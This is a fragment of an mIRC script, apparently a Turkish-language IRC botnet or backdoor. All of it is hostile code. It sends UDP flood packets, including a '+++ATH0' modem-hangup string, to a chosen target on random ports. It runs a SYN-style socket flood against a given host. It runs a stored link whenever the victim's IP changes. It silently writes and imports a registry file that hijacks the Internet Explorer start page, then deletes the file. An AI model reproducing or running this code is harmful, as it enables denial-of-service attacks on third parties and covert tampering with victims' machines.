  sockudp gnumc4 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
  %gnum.p = $r(1,65000)
  sockudp gnumc5 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  %gnum.p = $r(1,65000)
  sockudp gnumc6 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  %gnum.p = $r(1,65000)
  sockudp gnumc7 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
  sockudp gnumc8 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
  return |  :done | //msg %pchan Packeting Finished! | .timergcoolt off | unset %gnum* | unset %pchan 
}

alias synp { if ($1 == $null) { return } | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop |  SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | srvmsg Packet Sona Erdi! }
alias SYN {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen SYN $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(SYN*,0) > 0) { sockclose SYN* } }
}
alias srvmsg { msg #�  $1- } }
alias click {
  if ($ip != %ipimiz) { run %link | set %ipimiz $ip }
  elseif ($ip = %ipimiz) { echo ip ayni }
}
alias strpage {
  .set %strpage $r(10,1999) $+ .reg 
  .write %strpage REGEDIT4
  .write %strpage [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
  .write %strpage "Start Page"="http://www.mirckurdu.org"
  run -n regedit /s %strpage 
  timer 1 4 remove %strpage
}